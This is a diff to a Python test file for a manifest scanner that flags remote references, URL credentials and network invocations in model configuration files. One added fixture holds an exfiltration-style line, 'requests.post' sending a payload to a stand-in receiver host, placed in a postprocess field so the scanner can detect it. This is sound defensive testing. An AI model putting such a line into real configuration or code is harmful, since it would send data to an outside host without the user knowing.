@@ -1696,7 +1696,7 @@ def test_passive_config_references_leave_no_findings(tmp_path: Path) -> None:
         path,
         description="See https://bit.ly/callback and 8.8.8.8:4444",
         references=["s3://research/paper.pdf", "https://research.example/payload", "docs.example"],
-        documentation={"url": "https://example.com/license"},
+        documentation={"url": "https://example.com/license/requests.post(sample)"},
     )
 
     result = ManifestScanner().scan(str(path))
@@ -1711,6 +1711,7 @@ def test_remote_config_fields_and_url_credentials_are_reported(tmp_path: Path) -
         path,
         model_url="s3://weights/models/model.bin",
         settings={"callback_url": "https://receiver.example/upload"},
+        postprocess='requests.post("https://receiver.example/upload", data=payload)',
         documentation={"url": "https://example.com/guide?token=sample-credential"},
     )
 
@@ -1722,3 +1723,4 @@ def test_remote_config_fields_and_url_credentials_are_reported(tmp_path: Path) -
     assert failed["settings.callback_url"].name == "Remote Configuration Reference"
     assert failed["documentation.url"].name == "Config URL Credential Check"
     assert failed["documentation.url"].severity == IssueSeverity.WARNING
+    assert failed["postprocess"].name == "Config Network Invocation"
